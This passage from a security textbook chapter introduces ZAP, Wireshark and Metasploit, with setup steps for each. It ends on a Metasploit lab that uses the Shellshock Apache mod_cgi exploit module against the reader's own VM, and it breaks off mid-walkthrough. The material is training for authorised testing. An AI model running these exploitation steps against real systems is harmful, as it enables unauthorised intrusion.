<html><head></head><body>
<div id="sbo-rt-content"><div id="_idContainer199">
<h1 class="chapter-number" id="_idParaDest-157"><a id="_idTextAnchor161"/>10</h1>
<h1 id="_idParaDest-158"><a id="_idTextAnchor162"/>Integrating the Red Team and External Tools</h1>
<p>As we begin to conclude our introduction to the Kali Purple operating system, there are still a few voids here and there that we have to fill. We’ve covered a robust suite of blue team tools but not all of the tools this operating system has to offer are for cyber defense. In this chapter, we’re going to take a look at some tools that are native to Kali Linux from before the Purple distribution came into existence. We are also going to look at some very popular red team tools that are compatible with Kali Linux but may not necessarily be included in a <span class="No-Break">default distribution.</span></p>
<p>Hopefully, you’ve invested some time within the cybersecurity community before – or at least during – reading this book. If not, please do know that it’s okay for you to do that! At any rate, regardless of what independent study you might have enjoyed, you’ve probably noticed a few of the same brands being thrown around when it comes to certain <span class="No-Break">industry-related toolsets.</span></p>
<p>A recent poll on the popular professional networking site, LinkedIn, pitted many of the more well-known tools against each other in a <em class="italic">March Madness</em> style of competitive bracket and had the community vote on their favorites until a champion of sorts was announced. This unscientific and purely fun poll had <strong class="bold">Nmap</strong> come out on top as the voted-upon favorite with <strong class="bold">Burp Suite</strong> a close second place and each of the other tools we will discuss in this chapter ranking high – that is, <strong class="bold">Metasploit</strong>, <strong class="bold">Wireshark</strong>, and <strong class="bold">Zed Attack </strong><span class="No-Break"><strong class="bold">Proxy</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">ZAP</strong></span><span class="No-Break">).</span></p>
<p>Each of these tools has a section dedicated to it, except for Nmap, which will be grouped into a section, <em class="italic">Scanners</em>, that details many different types of scanners. It is worth noting that Nmap is also included in <strong class="bold">Metasploit</strong> – which might make you wonder why Metasploit didn’t win the playful poll. It’s because sometimes, people want simplicity and sometimes, they want the entire armory. It’s entirely subjective and as you grow in your cyber career, you’ll adjust and sometimes change your mind but ultimately begin to develop a style that is unique to you and <span class="No-Break">your personality.</span></p>
<p>In this chapter, we’ll cover the <span class="No-Break">following topics:</span></p>
<ul>
<li><span class="No-Break">OWASP ZAP</span></li>
<li><span class="No-Break">Wireshark</span></li>
<li><span class="No-Break">Metasploit</span></li>
<li><span class="No-Break">Scanners</span></li>
<li><span class="No-Break">Password-cracking utilities</span></li>
<li><span class="No-Break">Burp Suite</span></li>
</ul>
<h1 id="_idParaDest-159"><a id="_idTextAnchor163"/>Technical requirements</h1>
<p>The requirements for this chapter are <span class="No-Break">as follows:</span></p>
<ul>
<li><strong class="bold">Minimum requirements</strong>: A computing device with either the <em class="italic">amd64 (x86_64/64-bit)</em> or <em class="italic">i386 (x86/32-bit)</em> architecture. It should contain at least <em class="italic">8 GB</em> <span class="No-Break">of RAM.</span></li>
<li><strong class="bold">Recommended requirements</strong>: Based on feedback from cybersecurity field practitioners, aim for the <em class="italic">amd64 (x86_64/64-bit)</em> architecture with <em class="italic">16 GB</em> of RAM – more is better – and up to <em class="italic">64 GB</em> of additional disk space. Some of the applications in this chapter are resource hogs and while they’ll work with the minimum requirements, we can’t promise it will be <span class="No-Break">smooth sailing.</span></li>
</ul>
<h1 id="_idParaDest-160"><a id="_idTextAnchor164"/>OWASP ZAP</h1>
<p>We’ll begin our journey by exploring a <a id="_idIndexMarker835"/>product that was developed by the <strong class="bold">Open Web Application Security Project</strong> (<strong class="bold">OWASP</strong>). This is a nonprofit organization that is dedicated to improving the security of software. OWASP is a global community that works to create free resources and tools, as well as standards to help<a id="_idIndexMarker836"/> organizations acquire, develop, and maintain software and web applications with an emphasis <span class="No-Break">on security.</span></p>
<p>OWASP specializes in generating and raising awareness concerning web application security and associated risks. It provides guidance on what it considers best practices for building and testing secure web applications. OWASP is known for being collaborative and taking an open approach to security, focusing on transparency with community-driven initiatives. Some of their activities include developing security standards, organizing conferences and events, maintaining a vast repository of security knowledge, and supporting various open source projects such as the one we are about to <span class="No-Break">discuss: ZAP.</span></p>
<p>One of OWASP’s flagship products, ZAP is an open source web application security testing tool that offers a wide range of key features that make it a versatile and appealing choice for security professionals. Let’s take a look at what some of those <span class="No-Break">features are:</span></p>
<ul>
<li><strong class="bold">Active and passive scanning</strong>: ZAP offers both active and passive scanning abilities for identifying potential<a id="_idIndexMarker837"/> security vulnerabilities within web applications. Active scanning in this context is when ZAP actively sends requests to the target application in an attempt to identify such vulnerabilities. Passive scanning, on the other hand, is when ZAP monitors the traffic that is already occurring between the browser and the target application to detect security vulnerabilities without directly interacting with the <span class="No-Break">target application.</span></li>
<li><strong class="bold">Automated scanning</strong>: ZAP offers automated scanners that scan web applications for common <a id="_idIndexMarker838"/>vulnerabilities such as <strong class="bold">cross-site scripting</strong> (<strong class="bold">XSS</strong>) and SQL injection. Having automated scanners also generates automatic vulnerability detection. Like all automation, this is meant to generate efficiency, saving time <span class="No-Break">and effort.</span></li>
<li><strong class="bold">Interception and modification of HTTP requests</strong>: ZAP allows users to intercept <strong class="bold">Hypertext Transfer Protocol</strong> (<strong class="bold">HTTP</strong>) requests, a form of information that travels between the <a id="_idIndexMarker839"/>browser and the application. Users could then manipulate these requests and responses to test for security vulnerabilities <span class="No-Break">and misconfigurations.</span></li>
<li><strong class="bold">Fuzz testing</strong>: Fuzz testing, or <strong class="bold">fuzzing</strong>, is a type of testing that allows for some randomization on the part of the tester <a id="_idIndexMarker840"/>whereby they will attempt to introduce invalid or unexpected information as input to an application. An example might be responding with letters or special characters when the application is expecting a number, or returning a negative number when such a value would be illogical in a scenario. ZAP has built-in fuzzing abilities so that users can test different parts of HTTP requests to find and identify potential <span class="No-Break">security vulnerabilities.</span></li>
<li><strong class="bold">Support for scripting</strong>: We’ve talked about scripting several times already. It’s a powerful manner of developing automatic behaviors for many of the tools we’ve discussed. ZAP supports various scripting languages, including JavaScript, Ruby, and Python. While we’ve<a id="_idIndexMarker841"/> emphasized Python in this book due to its overwhelming popularity and adoption in cybersecurity-related tools, and the profession itself, you are not restricted to using that language if you’d like to branch out and develop a skillset in a different language. JavaScript has the benefit of also being popularly used in website/page development and Ruby has universal uses <span class="No-Break">as well.</span></li>
<li><strong class="bold">REST API</strong>: We explained what both REST and API mean near the beginning of <a href="B21223_08.xhtml#_idTextAnchor134"><span class="No-Break"><em class="italic">Chapter 8</em></span></a> when we discussed <strong class="bold">Cortex</strong>. Refer to that section if you’d like a refresher. In short, these <a id="_idIndexMarker842"/>concepts allow for integration between different technologies. In other words, ZAP supports the REST API so that other applications can use it to integrate with their <a id="_idIndexMarker843"/>workflows and <strong class="bold">continuous integration/continuous deployment</strong> (<span class="No-Break"><strong class="bold">CI/CD</strong></span><span class="No-Break">) pipelines.</span></li>
<li><strong class="bold">Support for authentication</strong>: ZAP is particularly useful in testing the authentication aspects of an application. It provides support for testing through mechanisms such as form-based authentication, HTTP authentication, and client certificate authentication. There are authentication configuration settings within ZAP that users can use to test these aspects of <span class="No-Break">an application.</span></li>
</ul>
<p>ZAP should already be installed within your Kali Purple instance. To make sure, let’s go through the motions of quickly grabbing a copy; if it’s already installed, Kali will let us know. If not, we’ll get our copy. Alternatively, we can select the Kali dragon icon in the top-left corner of our environment and either type <strong class="source-inline">ZAP</strong> in the search bar or scroll down and highlight <strong class="bold">Identify</strong> and then move our cursor to the newly expanded column on the right-hand side. Once we’ve done this, we can scroll near the bottom to find and click on the <span class="No-Break"><strong class="bold">ZAP</strong></span><span class="No-Break"> option.</span></p>
<p>Type <strong class="source-inline">sudo apt update</strong>; if the results suggest that you upgrade, type <strong class="source-inline">sudo apt upgrade</strong> to install them. Once you’re finished, type <strong class="source-inline">sudo apt install zaproxy</strong> to formally <span class="No-Break">install ZAP.</span></p>
<p>Let’s launch the <a id="_idIndexMarker844"/>application. To do that, type <strong class="source-inline">zaproxy</strong>. You will be asked whether you want to persist the session. The decision <span class="No-Break">is yours:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer173">
<img alt="Figure 10.1 – ZAP launch screen – request to persist" height="675" src="image/B21223_10_01.jpg" width="900"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.1 – ZAP launch screen – request to persist</p>
<p>Persisting the session means preserving the state of ZAP as you left it. It saves the state of the application, including all configurations, settings, data, and activities, so that you can access and resume those activities later. Examples of such settings may include scan results, whether active or passive, so that they include any identified vulnerabilities, warnings, or other findings, any information that was intercepted while proxying HTTP requests and responses, such as headers, parameters, cookies, and content, as well as any session requests that were made, scripts that were executed, or credentials and tokens that <span class="No-Break">were saved.</span></p>
<p>ZAP has its own internal package updater. Whether you wish to use it is up to you. We are going to select the <strong class="bold">Update All</strong> button at <a id="_idIndexMarker845"/>the bottom right of <span class="No-Break">the window:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer174">
<img alt="Figure 10.2 – ZAP launch screen – request to persist" height="969" src="image/B21223_10_02.jpg" width="805"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.2 – ZAP launch screen – request to persist</p>
<p>To use ZAP, you must configure your browser so that it can use ZAP as a proxy. We’ve provided instructions for doing so for both Mozilla Firefox and Google Chrome because they are the two most likely web<a id="_idIndexMarker846"/> browsers you’ll experience in Kali Linux. If you wish to use a different browser, a simple web search <span class="No-Break">should help.</span></p>
<h2 id="_idParaDest-161"><a id="_idTextAnchor165"/>Mozilla Firefox</h2>
<p>Follow these steps to configure Mozilla <a id="_idIndexMarker847"/>Firefox to <span class="No-Break">use ZAP:</span></p>
<ol>
<li>Launch Mozilla Firefox within <a id="_idIndexMarker848"/>your Kali <span class="No-Break">Purple environment.</span></li>
<li>Open the hamburger menu at the <span class="No-Break">top right.</span></li>
<li>Select <strong class="bold">Settings</strong> from the drop-down menu, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.3</em></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer175">
<img alt="Figure 10.3 – Configuring Firefox as a proxy" height="862" src="image/B21223_10_03.jpg" width="1379"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.3 – Configuring Firefox as a proxy</p>
<ol>
<li value="4">Scroll the main window until <a id="_idIndexMarker849"/>you reach the <strong class="bold">Network </strong><span class="No-Break"><strong class="bold">Settings</strong></span><span class="No-Break"> section.</span></li>
<li>Select the <strong class="bold">Settings…</strong> button, as <a id="_idIndexMarker850"/>shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.4</em></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer176">
<img alt="Figure 10.4 – Accessing Firefox’s network settings" height="214" src="image/B21223_10_04.jpg" width="1058"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.4 – Accessing Firefox’s network settings</p>
<ol>
<li value="6">Select the <strong class="bold">Manual proxy configuration</strong> <span class="No-Break">radio button.</span></li>
<li>Enter the host IP address in the <strong class="bold">HTTP Proxy</strong> field – in our case, <strong class="source-inline">127.0.0.1</strong> – and enter <strong class="source-inline">8080</strong> as the value <span class="No-Break">for </span><span class="No-Break"><strong class="bold">Port</strong></span><span class="No-Break">.</span></li>
<li>Select the <strong class="bold">Also use this proxy for </strong><span class="No-Break"><strong class="bold">HTTPS</strong></span><span class="No-Break"> box.</span></li>
<li>Select <strong class="bold">OK</strong> in the <a id="_idIndexMarker851"/>bottom-right corner of the <span class="No-Break">pop-up window:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer177">
<img alt="Figure 10.5 – Adding Firefox proxy settings" height="892" src="image/B21223_10_05.jpg" width="1128"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.5 – Adding Firefox proxy settings</p>
<p>Now, let’s look at<a id="_idIndexMarker852"/> <span class="No-Break">Google Chrome.</span></p>
<h2 id="_idParaDest-162"><a id="_idTextAnchor166"/>Google Chrome</h2>
<p>Follow these steps<a id="_idIndexMarker853"/> to configure Google<a id="_idIndexMarker854"/> Chrome to <span class="No-Break">use ZAP:</span></p>
<ol>
<li>Launch Google Chrome within your Kali <span class="No-Break">Purple environment</span></li>
<li>Select the vertical ellipses – that is, the three dots at the top right of the <span class="No-Break">Chrome browser.</span></li>
<li>Select <strong class="bold">Settings</strong> from the drop-down menu, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.6</em></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer178">
<img alt="Figure 10.6 – Configuring Google Chrome as a proxy" height="809" src="image/B21223_10_06.jpg" width="1339"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.6 – Configuring Google Chrome as a proxy</p>
<ol>
<li value="4">In the left column, scroll <a id="_idIndexMarker855"/>down until you see <strong class="bold">System</strong> and <span class="No-Break">select it.</span></li>
<li>The main window will include new options. Select <strong class="bold">Open your computer’s </strong><span class="No-Break"><strong class="bold">proxy settings</strong></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer179">
<img alt="Figure 10.7 – Accessing Chrome’s proxy settings" height="814" src="image/B21223_10_07.jpg" width="1170"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.7 – Accessing Chrome’s proxy settings</p>
<ol>
<li value="6">In the <strong class="bold">Proxy</strong> section, for <strong class="bold">Automatically detect settings</strong>, select the<a id="_idIndexMarker856"/> toggle button so that it <a id="_idIndexMarker857"/>says <strong class="bold">Off</strong>, as shown in the top right of <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.8</em></span><span class="No-Break">.</span></li>
<li>For the <strong class="bold">Use a proxy server</strong> field, select <span class="No-Break"><strong class="bold">Set up</strong></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer180">
<img alt="Figure 10.8 – Chrome’s auto-detect settings" height="635" src="image/B21223_10_08.jpg" width="1417"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.8 – Chrome’s auto-detect settings</p>
<ol>
<li value="8">In the pop-up box, select <a id="_idIndexMarker858"/>the toggle button for <strong class="bold">Use a proxy server</strong> so that it <span class="No-Break">says </span><span class="No-Break"><strong class="bold">On</strong></span><span class="No-Break">.</span></li>
<li>Enter the host IP <a id="_idIndexMarker859"/>address in the <strong class="bold">Proxy IP address</strong> field – in our case, <strong class="source-inline">127.0.0.1</strong> – and enter <strong class="source-inline">8080</strong> as the value <span class="No-Break">for </span><span class="No-Break"><strong class="bold">Port</strong></span><span class="No-Break">.</span></li>
<li>Select <strong class="bold">Save</strong> in the bottom-left corner of the <span class="No-Break">pop-up window:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer181">
<img alt="Figure 10.9 – Accessing Chrome’s proxy settings" height="848" src="image/B21223_10_09.jpg" width="1412"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.9 – Accessing Chrome’s proxy settings</p>
<p>Regardless of which browser you <a id="_idIndexMarker860"/>wish to use, ensure you close the browser window entirely when you’re finished and return to your ZAP instance. In the main<a id="_idIndexMarker861"/> window, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.10</em>, you will notice four tiles you can choose from. These are <strong class="bold">Automated Scan</strong>, <strong class="bold">Manual Explore</strong>, <strong class="bold">Support</strong>, and <strong class="bold">Learn More</strong>. We highly encourage you to invest some time clicking through the links within <strong class="bold">Support</strong> and <strong class="bold">Learn More</strong> to get a grasp of how ZAP works. For proof-of-concept, let’s set up and run a quick <span class="No-Break">automated scan:</span></p>
<ol>
<li>Select the <strong class="bold">Manual </strong><span class="No-Break"><strong class="bold">Explore</strong></span><span class="No-Break"> tile.</span></li>
<li>Add the URL address for <strong class="bold">HTTP Proxy</strong> that we added in the preceding step. In our case, <span class="No-Break">it’s </span><span class="No-Break"><strong class="source-inline">http://127.0.0.1:8080</strong></span><span class="No-Break">.</span></li>
<li>Select the <strong class="bold">Enable </strong><span class="No-Break"><strong class="bold">HUD</strong></span><span class="No-Break"> checkbox.</span></li>
<li>Ensure either the Firefox or Chrome browser is selected in the drop-down menu to the right of the <strong class="bold">Launch </strong><span class="No-Break"><strong class="bold">Browser</strong></span><span class="No-Break"> button.</span></li>
<li>Click the <strong class="bold">Launch </strong><span class="No-Break"><strong class="bold">Browser</strong></span><span class="No-Break"> button:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer182">
<img alt="Figure 10.10 – Setting an attack target and launching the browser proxy" height="343" src="image/B21223_10_10.jpg" width="1089"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.10 – Setting an attack target and launching the browser proxy</p>
<ol>
<li value="6">Select the left angle<a id="_idIndexMarker862"/> bracket at the top left of the screen – highlighted in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.10</em> – to return to the <span class="No-Break">main screen.</span></li>
<li>Choose and select the <strong class="bold">Automated </strong><span class="No-Break"><strong class="bold">Scan</strong></span><span class="No-Break"> tile.</span></li>
<li>Enter the same URL you<a id="_idIndexMarker863"/> entered in the preceding step for the <strong class="bold">URL to </strong><span class="No-Break"><strong class="bold">attack</strong></span><span class="No-Break"> field.</span></li>
<li>Ensure the <strong class="bold">Use traditional spider</strong> field <span class="No-Break">is checked.</span></li>
<li>Select the <strong class="bold">Attack</strong> button. You should see a window – under <strong class="bold">Sent Messages</strong> – begin to populate with your automated scanning activity, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.11</em></span><span class="No-Break">:</span></li>
</ol>
<div>
<div class="IMG---Figure" id="_idContainer183">
<img alt="Figure 10.11 – Setting the attack target and launching the browser proxy" height="536" src="image/B21223_10_11.jpg" width="1123"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.11 – Setting the attack target and launching the browser proxy</p>
<p>In this section, we talked about OWASP’s flagship product, ZAP, and how it’s used for web application testing. However, testing the applications themselves is only part of the overall cybersecurity puzzle. If you were to be on the receiving end of an attack, analyzing the type of <a id="_idIndexMarker864"/>traffic might lead you to discover the attacker’s potential tools through packet examination. You may also discover known patterns or styles to help identify who is attacking or a <a id="_idIndexMarker865"/>particular method of attack. Each of these things can help narrow down the objective of the attacker and therefore help pinpoint where the vulnerability that might be actively exploited lies. In the next section, we’re going to cover a well-known tool that’s designed to take apart these communication packets and study <span class="No-Break">them: Wireshark.</span></p>
<h1 id="_idParaDest-163"><a id="_idTextAnchor167"/>Wireshark</h1>
<p>We’ve talked about Wireshark several times <a id="_idIndexMarker866"/>throughout this book. It is arguably the most popular network protocol analyzer utility within the world of networking and cybersecurity in use today. This tool allows its users to capture and interactively navigate through the traffic running on a computer network. However, its uses go beyond simple vulnerability and threat identification. Network administrators can use it to monitor traffic behavior and conditions to troubleshoot any performance issues and/or anomalous behavior, even if it’s not related to vulnerabilities or malicious activity. Here’s a high-level overview of Wireshark’s <span class="No-Break">key features:</span></p>
<ul>
<li><strong class="bold">Packet analysis</strong>: In short, Wireshark captures packets of information on a network and displays them in a readable format, allowing users to analyze the content of each packet <span class="No-Break">in depth.</span></li>
<li><strong class="bold">Live capture for offline analysis</strong>: A nice feature of Wireshark is that while users can capture the packets in<a id="_idIndexMarker867"/> real time, they can also save those packets so that they can reopen them later for offline analysis. This also allows the users to attach those packet capture files<a id="_idIndexMarker868"/> to emails or ticketing systems as artifact evidence to support conclusions or to allow other analysts to evaluate the information <span class="No-Break">for comparison.</span></li>
<li><strong class="bold">Support for multiple protocols</strong>: Wireshark’s wide array of protocol support includes protocols such as TCP, UDP, IP, HTTP, HTTPS, DNS, and others. This increases the utility of Wireshark substantially as analysts can examine information that supports the most common styles of <span class="No-Break">network traffic.</span></li>
<li><strong class="bold">Deep inspection</strong>: Part of conducting a solid analysis of network traffic is having the ability to drill down deeply into the individual packets that are captured by Wireshark. This is where very detailed information resides. It might include information such as source and destination IP addresses, the timing of packets, and details that are specific to the protocols <span class="No-Break">being examined.</span></li>
<li><strong class="bold">Filtering and search</strong>: Wireshark offers filtering capabilities that focus on specific packets based on criteria such as IP addresses, protocols, and packet contents. Users can also filter by searching for specific strings that might be contained within <span class="No-Break">the packets.</span></li>
<li><strong class="bold">Statistics and graphs</strong>: Wireshark offers statistical analysis tools and graphs to help visualize network traffic patterns, packet distribution, and <span class="No-Break">protocol usage.</span></li>
<li><strong class="bold">Color coding</strong>: A very handy feature that Wireshark provides is the ability to color-code packets based on different sets of criteria that may or may not apply to the packet in question. This helps with the readability of the packet capture logs and creates an avenue of <a id="_idIndexMarker869"/>efficiency for analysts to narrow down <a id="_idIndexMarker870"/>threats, vulnerabilities, and/or <strong class="bold">indicators of </strong><span class="No-Break"><strong class="bold">compromise</strong></span><span class="No-Break"> (</span><span class="No-Break"><strong class="bold">IoCs</strong></span><span class="No-Break">).</span></li>
<li><strong class="bold">Customization</strong>: The Wireshark interface is highly customizable, with the user being able to set their preferences and display filters to weed out any unnecessary data and narrow down the results to display only what the user deems important to consider. If the user doesn’t find what they are looking for, they can easily change their preferences to display the data with additional considerations or to display different data altogether, even if it’s been taken from the same <span class="No-Break">packet capture.</span></li>
<li><strong class="bold">Voice over IP (VoIP) analysis</strong>: VoIP traffic is becoming more and more common as businesses and individuals<a id="_idIndexMarker871"/> continue to adopt digital communications<a id="_idIndexMarker872"/> solutions. Wireshark can capture VoIP packets for analysis as well! With these packets, users can monitor call quality, identify VoIP protocols, and troubleshoot voice <span class="No-Break">communication issues.</span></li>
<li><strong class="bold">Cross-platform compatibility</strong>: We’ve talked about cross-platform compatibility before and in the most general sense, you would usually see it as a reference to an application being compatible with both Windows and Linux and maybe also macOS. That is the case with Wireshark, which is compatible with all three of the major <span class="No-Break">operating systems.</span></li>
<li><strong class="bold">Capture file export</strong>: As we discussed when we talked about live capture, users can save the packet capture files for future use, including offline examination, for sharing with colleagues, or attaching to ticketing systems for artifact evidence. These files can be saved and exported as PCAP, CSV, or plain <span class="No-Break">text files.</span></li>
<li><strong class="bold">Protocol decoding support</strong>: Wireshark is built with the ability to decode and display data from hundreds of protocols, allowing analysts to gain deep insights into the network communications <span class="No-Break">being examined.</span></li>
</ul>
<p>Like ZAP, Wireshark should already be installed within your Kali Purple instance. Let’s check this by trying to install it anew, like we did <span class="No-Break">with ZAP.</span></p>
<p>Alternatively, we can select the Kali dragon icon in the top-left corner of our environment and either type <strong class="source-inline">Wireshark</strong> in the search bar or scroll down and highlight <strong class="bold">Protect</strong> and then move our cursor to the newly expanded column on the right-hand side. At this point, we can scroll <a id="_idIndexMarker873"/>near the bottom to find and click on the <span class="No-Break"><strong class="bold">Wireshark</strong></span><span class="No-Break"> option.</span></p>
<p>Otherwise, if you prefer to type, then type <strong class="source-inline">sudo apt update</strong>; if the results suggest making some upgrades, type <strong class="source-inline">sudo apt upgrade</strong> to install them. Once you’re finished, type <strong class="source-inline">sudo apt install wireshark</strong> to formally <span class="No-Break">install Wireshark.</span></p>
<p>Let’s launch the application. To do that, type <strong class="source-inline">wireshark</strong>. When the application loads, you will be asked to select the network interface you wish to capture traffic from. For our working example, let’s just select the <strong class="bold">eth0</strong> interface; this will likely be the first item in the list and already be highlighted for you. Once that field is highlighted, move your cursor to the blue shark fin icon, which resides directly under the word <strong class="bold">File</strong> at the top left, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.12</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer184">
<img alt="Figure 10.12 – Wireshark – selecting a network interface and starting a packet capture" height="554" src="image/B21223_10_12.jpg" width="735"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.12 – Wireshark – selecting a network interface and starting a packet capture</p>
<p>Select the <strong class="bold">Start capturing packets</strong> shark fin icon in the top-left corner. Now, within your Kali Purple environment, load any web browser and go to any website to create some traffic for Wireshark to capture. Once you’ve done this, return to the Wireshark application and select the red square icon next to the shark fin icon to stop <span class="No-Break">capturing packets.</span></p>
<p>You’ll immediately note that the main window fills with rows and rows of data, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.13</em>. Each row is a packet capture, and they will be color-coded within <span class="No-Break">your environment:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer185">
<img alt="Figure 10.13 – Wireshark after collecting network packets" height="270" src="image/B21223_10_13.jpg" width="1209"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.13 – Wireshark after collecting network packets</p>
<p>In the lower-left window, known<a id="_idIndexMarker874"/> as the packet details pane, you’ll notice some topics with arrows to the left that you can click on to expand. This will allow you to do a deep dive into the information you’ve captured. In our case, the first line would be the frame we’ve highlighted in the main window. The second references the type of network interface we captured from, which is Ethernet II. The third one tells us the IP protocol we captured – for us, it’s IPv4. It identifies our traffic as TCP traffic. However, in the process of packet capture, you will most assuredly see frames with UDP listed here just as often. After that, you’ll see any number of different protocols for deeper analysis, including DNS <span class="No-Break">and HTTP.</span></p>
<p>Wireshark is a strongly developed application with a very long history and there are an abundance of free training materials out there to help you master this program if you’d like to become a packet capture and analysis guru. We’ve tossed some valuable links in the <em class="italic">Further </em><span class="No-Break"><em class="italic">reading</em></span><span class="No-Break"> section.</span></p>
<p>Wireshark helps you evaluate the angle of attack and the styles of attackers, as well as what the intended target of the attacker might be. In the next section, we are going to learn about one of the most robust and <a id="_idIndexMarker875"/>popular exploitation and malicious payload delivery applications in the cybersecurity world today: Metasploit. It is popular with pentesters and cybercriminals alike and has a robust database of already prepared malicious payloads and attack styles at <span class="No-Break">the ready.</span></p>
<h1 id="_idParaDest-164"><a id="_idTextAnchor168"/>Metasploit</h1>
<p>Though mostly spoken of as a penetration testing framework, anyone who’s worked in the field of cybersecurity for a year <a id="_idIndexMarker876"/>or less knows that Metasploit is also one of the most popular weapons of choice in use by cybercriminals. This framework comes pre-packed with cyberattacks and malicious payloads already built in. Some of the other tools you’ll encounter in your cyber career are included in the Metasploit framework, most notably the aforementioned Nmap. While a popular and valuable penetration testing tool, make no mistake: Metasploit is an extremely vicious weapon if placed into the <span class="No-Break">wrong hands.</span></p>
<p>Being a core component of red teaming and pentesting, Metasploit is already included in the Kali Linux distribution. You can access it by selecting the Kali Purple dragon icon, as you’ve done with other utilities, scrolling down, hovering your mouse over the <strong class="bold">Exploitation Tools</strong> field, and then selecting it from the menu that expands to the right. You can also start typing <strong class="source-inline">Metasploit</strong> into the search bar at the top and select it as <span class="No-Break">it populates.</span></p>
<p>But before you do this, let’s write our script. Navigate to <strong class="source-inline">cgi-bin</strong> by typing <strong class="source-inline">cd /usr/lib/cgi-bin</strong>. Then, create your script file within that location by typing <strong class="source-inline">sudo nano metatest.sh</strong>. Once you’re inside that file, add the following lines, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.14</em></span><span class="No-Break">:</span></p>
<ul>
<li><strong class="source-inline">#! /</strong><span class="No-Break"><strong class="source-inline">bin/bash</strong></span></li>
<li><strong class="source-inline">echo "</strong><span class="No-Break"><strong class="source-inline">Content-type: text/html"</strong></span></li>
<li><strong class="source-inline">echo " "</strong></li>
<li><strong class="source-inline">echo "You've </strong><span class="No-Break"><strong class="source-inline">been Pwned!"</strong></span><span class="No-Break">:</span></li>
</ul>
<div>
<div class="IMG---Figure" id="_idContainer186">
<img alt="Figure 10.14 – Our first Metasploit attack script" height="125" src="image/B21223_10_14.jpg" width="254"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.14 – Our first Metasploit attack script</p>
<p>Before launching the actual application, let’s save our script by pressing <em class="italic">Ctrl</em> + <em class="italic">X</em> to close the file and <em class="italic">Y</em> if you wish to save it (hopefully you do; otherwise, you’ll have to type it all over again!). Now, return to the Kali Purple dragon icon, hover your mouse over the <strong class="bold">Exploitation Tools</strong> field, and select <strong class="bold">Metasploit</strong> from <span class="No-Break">the menu.</span></p>
<p>You can also invoke Metasploit directly from the command line. However, before you do that, you should initialize the Metasploit database by typing <strong class="source-inline">sudo msfdb init</strong>. The reason is that we aren’t letting you go away without having some fun. We’re going to launch an exploit with Metasploit right here, <span class="No-Break">right now.</span></p>
<p>Once the database has been<a id="_idIndexMarker877"/> initialized, start the beast by typing <strong class="source-inline">msfconsole</strong> to invoke the application. When you do, it may take a few moments to load because of its very large database of exploits and payloads, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><span class="No-Break"><em class="italic">.15</em></span><span class="No-Break">:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer187">
<img alt="Figure 10.15 – Metasploit initialization" height="682" src="image/B21223_10_15.jpg" width="555"/>
</div>
</div>
<p class="IMG---Caption" lang="en-US" xml:lang="en-US">Figure 10.15 – Metasploit initialization</p>
<p>Now that Metasploit has been loaded, we are going to find and use the Shellshock vulnerability. Type <strong class="source-inline">search shellshock</strong> to get a listing of all the various exploits related to this vulnerability, as shown in <span class="No-Break"><em class="italic">Figure 10</em></span><em class="italic">.15</em>. Now, we need to tell Metasploit which of these exploits we<a id="_idIndexMarker878"/> intend to use. We’ll use the Apache mod version. To do so, type <strong class="source-inline">use exploit/multi/http/apache_mod_cgi_bash_env_exec</strong>. Now, we need to tell Metasploit who the attacking machine is and who the target machine is. Type <strong class="source-inline">set RHOST &lt;target IP address&gt;</strong> and make sure you have permission to attack this target. Try using your VM IP address like we did. Next, type <strong class="source-inline">set LHOST &lt;attacker IP address&gt;</strong>. In our case, this will be <span class="No-Break">the localhost:</span></p>
<div>
<div class="IMG---Figure" id="_idContainer188">
